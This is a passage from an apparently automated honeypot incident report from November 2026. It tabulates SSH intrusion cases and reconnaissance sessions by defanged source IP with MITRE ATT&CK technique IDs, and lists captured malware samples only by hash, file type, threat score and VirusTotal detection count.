| IR-b89449cca282 | HIGH | `193.32.162[.]15` | 2026-11-06 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aaa269949518 | HIGH | `117.50.119[.]17` | 2026-11-06 05:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cb960709c30f | HIGH | `117.50.119[.]17` | 2026-11-06 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96073f66614d | HIGH | `138.226.239[.]233` | 2026-11-06 06:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-11940cbfce2c | HIGH | `77.90.185[.]29` | 2026-11-06 06:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9eacb32613a3 | HIGH | `193.32.162[.]15` | 2026-11-06 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74daa097dc28 | HIGH | `14.17.59[.]195` | 2026-11-06 06:32 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-7af2dd1c7363 | HIGH | `77.239.124[.]179` | 2026-11-06 06:50 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e22970db1913 | HIGH | `152.42.200[.]153` | 2026-11-06 06:56 | Y | 1 | 0 | `T1078` |
| IR-f571f202a578 | HIGH | `82.38.134[.]233` | 2026-11-06 07:30 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-9143c47f66c0 | HIGH | `82.38.134[.]233` | 2026-11-06 07:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7972923bce6 | HIGH | `176.53.159[.]196` | 2026-11-06 07:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3704173ef159 | HIGH | `193.32.162[.]84` | 2026-11-06 07:40 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cbc377ea0a36 | HIGH | `193.32.162[.]84` | 2026-11-06 07:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e3d1e77ec911 | HIGH | `193.32.162[.]84` | 2026-11-06 07:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4d1dcd4898e4 | HIGH | `193.32.162[.]84` | 2026-11-06 07:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-91f853611a9f | HIGH | `193.32.162[.]84` | 2026-11-06 07:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-594925b4bbbe | HIGH | `118.145.239[.]129` | 2026-11-06 07:51 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-946c6274fcab | HIGH | `118.145.239[.]129` | 2026-11-06 07:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0694ffde0cb4 | HIGH | `193.32.162[.]84` | 2026-11-06 07:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-759b83864066 | HIGH | `193.32.162[.]84` | 2026-11-06 07:55 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e7cac48caabc | HIGH | `193.32.162[.]84` | 2026-11-06 07:57 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5c4fe253301d | HIGH | `193.32.162[.]84` | 2026-11-06 07:59 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1d3243853eeb | HIGH | `193.32.162[.]84` | 2026-11-06 08:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2c5895f0b1fa | HIGH | `193.32.162[.]84` | 2026-11-06 08:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e77ea170efd0 | HIGH | `193.32.162[.]84` | 2026-11-06 08:05 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bc767b918aaa | HIGH | `193.32.162[.]84` | 2026-11-06 08:07 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-267af0d320e9 | HIGH | `193.32.162[.]84` | 2026-11-06 08:09 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f8bbfa1bd830 | HIGH | `193.32.162[.]84` | 2026-11-06 08:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e89b0c14d12b | HIGH | `193.32.162[.]84` | 2026-11-06 08:13 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-452c11d387f9 | HIGH | `193.32.162[.]84` | 2026-11-06 08:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-eca4fa70ab92 | HIGH | `193.32.162[.]84` | 2026-11-06 08:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-88b8100dbc32 | HIGH | `193.32.162[.]84` | 2026-11-06 08:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8eb3af296759 | HIGH | `193.32.162[.]84` | 2026-11-06 08:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2502e13a4508 | HIGH | `193.32.162[.]84` | 2026-11-06 08:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5d81be5c387e | HIGH | `20.13.164[.]162` | 2026-11-06 08:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f3d71f1a62c9 | HIGH | `20.13.164[.]162` | 2026-11-06 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61a9f88c8e2d | HIGH | `193.32.162[.]84` | 2026-11-06 08:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-64dede175f51 | HIGH | `193.32.162[.]84` | 2026-11-06 08:28 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-937129ece07d | HIGH | `193.32.162[.]84` | 2026-11-06 08:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9986acb60ca3 | HIGH | `193.32.162[.]84` | 2026-11-06 08:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-10446be4c6e2 | HIGH | `193.32.162[.]84` | 2026-11-06 08:36 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-52873035cad6 | HIGH | `193.32.162[.]84` | 2026-11-06 08:38 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a5285dca7467 | HIGH | `91.186.216[.]80` | 2026-11-06 08:46 | Y | 4 | 0 | `T1078` |
| IR-2419e84c8b6c | HIGH | `102.23.122[.]235` | 2026-11-06 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6b099f15fd2a | HIGH | `102.23.122[.]235` | 2026-11-06 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7344c20852a0 | HIGH | `190.105.160[.]5` | 2026-11-06 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cd16588a0c4e | HIGH | `190.105.160[.]5` | 2026-11-06 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62d44e13ea9f | HIGH | `91.186.216[.]80` | 2026-11-06 08:54 | Y | 0 | 0 | `T1078` |
| IR-642f4eff322c | HIGH | `20.184.59[.]236` | 2026-11-06 08:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4f0ec2c7c81 | HIGH | `20.184.59[.]236` | 2026-11-06 08:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf2a65060ced | HIGH | `176.53.159[.]196` | 2026-11-06 08:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bac3efd88bce | HIGH | `27.72.31[.]67` | 2026-11-06 09:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c0ca59f0f302 | HIGH | `183.91.11[.]36` | 2026-11-06 09:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-22cda6b10ca4 | HIGH | `27.72.31[.]67` | 2026-11-06 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0460732181ae | HIGH | `183.91.11[.]36` | 2026-11-06 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c232e7271d34 | HIGH | `173.244.60[.]241` | 2026-11-06 09:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cd50f8d0cb6b | HIGH | `173.244.60[.]241` | 2026-11-06 09:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-538e713b9694 | HIGH | `77.90.185[.]29` | 2026-11-06 09:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dbbb930a48fd | HIGH | `119.255.245[.]44` | 2026-11-06 09:23 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-87cab1d1f55c | HIGH | `152.42.200[.]153` | 2026-11-06 09:25 | Y | 5 | 2 | `T1078 · T1105` |
| IR-f367a1eb40b2 | HIGH | `193.187.110[.]160` | 2026-11-06 10:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3edf4664e143 | HIGH | `186.209.52[.]216` | 2026-11-06 10:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ed4858dfc9af | HIGH | `186.209.52[.]216` | 2026-11-06 10:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ccb0cf512db8 | HIGH | `152.42.200[.]153` | 2026-11-06 10:07 | Y | 5 | 0 | `T1078 · T1105` |
| IR-6c2c92a0c4b1 | HIGH | `23.132.164[.]185` | 2026-11-06 10:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bf01cac47a2f | HIGH | `176.53.159[.]196` | 2026-11-06 10:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-12b8a9a3054c | HIGH | `163.7.8[.]79` | 2026-11-06 10:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-084dd923920c | HIGH | `163.7.8[.]79` | 2026-11-06 10:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f768430e26ac | HIGH | `172.236.239[.]55` | 2026-11-06 10:43 | Y | 3 | 0 | `T1078` |
| IR-1b2df40fcada | HIGH | `193.8.186[.]29` | 2026-11-06 10:50 | Y | 5 | 0 | `T1078` |
| IR-e0e1334a7ce7 | HIGH | `118.193.45[.]134` | 2026-11-06 11:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5df1bfb86ceb | HIGH | `118.193.45[.]134` | 2026-11-06 11:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0237dda9433f | HIGH | `111.238.174[.]6` | 2026-11-06 11:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8278997b55ab | HIGH | `111.238.174[.]6` | 2026-11-06 11:05 | Y | 0 | 0 | `T1078 · T1592` |
_… 41 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **4** | 2026-11-06 05:52 | 2026-11-06 10:50 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-11-06 13:43 | 2026-11-06 16:44 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-11-06 03:02 | 2026-11-06 06:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `222.110.19[.]24` | **3** | 2026-11-06 03:40 | 2026-11-06 06:08 | 1m | 0 | `T1592` | 🟢 LOW |
| `222.110.19[.]24` | **3** | 2026-11-06 08:10 | 2026-11-06 12:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]159` | **2** | 2026-11-06 07:06 | 2026-11-06 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-06 15:30 | 2026-11-06 16:06 | 1m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | **2** | 2026-11-06 05:43 | 2026-11-06 06:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | **2** | 2026-11-06 13:55 | 2026-11-06 14:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-11-06 07:51 | 2026-11-06 08:34 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `102.210.221[.]58` | 1 | 2026-11-06 04:06 | 2026-11-06 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.177[.]208` | 1 | 2026-11-06 14:43 | 2026-11-06 14:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]159` | 1 | 2026-11-06 04:15 | 2026-11-06 04:15 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.6.41[.]103` | 1 | 2026-11-06 04:14 | 2026-11-06 04:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.196.84[.]13` | 1 | 2026-11-06 10:09 | 2026-11-06 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.231.14[.]147` | 1 | 2026-11-06 14:11 | 2026-11-06 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.245.96[.]93` | 1 | 2026-11-06 05:12 | 2026-11-06 05:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.122.134[.]91` | 1 | 2026-11-06 05:08 | 2026-11-06 05:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-11-06 02:55 | 2026-11-06 02:55 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.214.251[.]205` | 1 | 2026-11-06 16:35 | 2026-11-06 16:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-06 03:46 | 2026-11-06 03:47 | 57s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-06 10:21 | 2026-11-06 10:21 | 30s | 0 | `T1592` | 🟢 LOW |
| `152.42.200[.]153` | 1 | 2026-11-06 06:56 | 2026-11-06 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `156.225.1[.]108` | 1 | 2026-11-06 15:50 | 2026-11-06 15:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `168.197.11[.]202` | 1 | 2026-11-06 14:21 | 2026-11-06 14:22 | 32s | 0 | `T1592` | 🟢 LOW |
| `170.80.242[.]75` | 1 | 2026-11-06 07:05 | 2026-11-06 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | 1 | 2026-11-06 14:32 | 2026-11-06 14:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.239[.]55` | 1 | 2026-11-06 10:43 | 2026-11-06 10:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-11-06 13:58 | 2026-11-06 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]109` | 1 | 2026-11-06 04:15 | 2026-11-06 04:15 | 1s | 0 | `T1592` | 🟢 LOW |
| `186.26.102[.]232` | 1 | 2026-11-06 11:33 | 2026-11-06 11:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `188.187.5[.]61` | 1 | 2026-11-06 13:21 | 2026-11-06 13:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.162.227[.]38` | 1 | 2026-11-06 03:50 | 2026-11-06 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-06 10:59 | 2026-11-06 10:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-11-06 13:06 | 2026-11-06 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-11-06 10:50 | 2026-11-06 10:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-11-06 16:22 | 2026-11-06 16:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]31` | 1 | 2026-11-06 04:16 | 2026-11-06 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-06 04:26 | 2026-11-06 04:26 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]151` | 1 | 2026-11-06 06:56 | 2026-11-06 06:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-06 04:24 | 2026-11-06 04:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.115.49[.]229` | 1 | 2026-11-06 07:10 | 2026-11-06 07:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.55.39[.]90` | 1 | 2026-11-06 04:56 | 2026-11-06 04:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.65.144[.]189` | 1 | 2026-11-06 03:39 | 2026-11-06 03:39 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.65.179[.]64` | 1 | 2026-11-06 13:50 | 2026-11-06 13:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-11-06 15:57 | 2026-11-06 15:57 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.196.163[.]218` | 1 | 2026-11-06 15:03 | 2026-11-06 15:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.110.19[.]24` | 1 | 2026-11-06 14:10 | 2026-11-06 14:10 | 29s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-06 10:09 | 2026-11-06 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-06 08:56 | 2026-11-06 08:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.144[.]24` | 1 | 2026-11-06 04:08 | 2026-11-06 04:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `35.210.156[.]19` | 1 | 2026-11-06 05:14 | 2026-11-06 05:14 | 5s | 0 | `T1592` | 🟢 LOW |
| `35.210.184[.]225` | 1 | 2026-11-06 04:46 | 2026-11-06 04:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.36[.]43` | 1 | 2026-11-06 04:34 | 2026-11-06 04:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.210.7[.]122` | 1 | 2026-11-06 04:47 | 2026-11-06 04:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.52.191[.]134` | 1 | 2026-11-06 04:52 | 2026-11-06 04:52 | 32s | 0 | `T1592` | 🟢 LOW |
| `38.96.196[.]74` | 1 | 2026-11-06 05:37 | 2026-11-06 05:38 | 18s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-11-06 10:08 | 2026-11-06 10:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-06 04:06 | 2026-11-06 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-06 06:40 | 2026-11-06 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.134[.]139` | 1 | 2026-11-06 15:30 | 2026-11-06 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-06 07:39 | 2026-11-06 07:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-06 14:35 | 2026-11-06 14:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.251.137[.]156` | 1 | 2026-11-06 14:32 | 2026-11-06 14:32 | 32s | 0 | `T1592` | 🟢 LOW |
| `50.32.44[.]242` | 1 | 2026-11-06 10:25 | 2026-11-06 10:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.23.202[.]227` | 1 | 2026-11-06 06:35 | 2026-11-06 06:35 | 19s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]214` | 1 | 2026-11-06 10:52 | 2026-11-06 10:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]173` | 1 | 2026-11-06 03:35 | 2026-11-06 03:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-11-06 05:58 | 2026-11-06 05:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-06 05:23 | 2026-11-06 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.189.193[.]144` | 1 | 2026-11-06 08:40 | 2026-11-06 08:40 | 14s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]142` | 1 | 2026-11-06 11:39 | 2026-11-06 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]212` | 1 | 2026-11-06 09:18 | 2026-11-06 09:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]141` | 1 | 2026-11-06 13:31 | 2026-11-06 13:31 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]108` | 1 | 2026-11-06 12:31 | 2026-11-06 12:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | 1 | 2026-11-06 14:31 | 2026-11-06 14:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]210` | 1 | 2026-11-06 13:32 | 2026-11-06 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]186` | 1 | 2026-11-06 14:32 | 2026-11-06 14:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | 1 | 2026-11-06 14:32 | 2026-11-06 14:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]56` | 1 | 2026-11-06 04:30 | 2026-11-06 04:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]91` | 1 | 2026-11-06 13:31 | 2026-11-06 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `74.207.243[.]103` | 1 | 2026-11-06 09:09 | 2026-11-06 09:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-06 03:35 | 2026-11-06 03:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-06 15:49 | 2026-11-06 15:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.105.36[.]140` | 1 | 2026-11-06 13:44 | 2026-11-06 13:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.222.160[.]19` | 1 | 2026-11-06 03:47 | 2026-11-06 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]10` | 1 | 2026-11-06 16:06 | 2026-11-06 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.237.204[.]44` | 1 | 2026-11-06 10:42 | 2026-11-06 10:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-11-06 12:57 | 2026-11-06 12:57 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
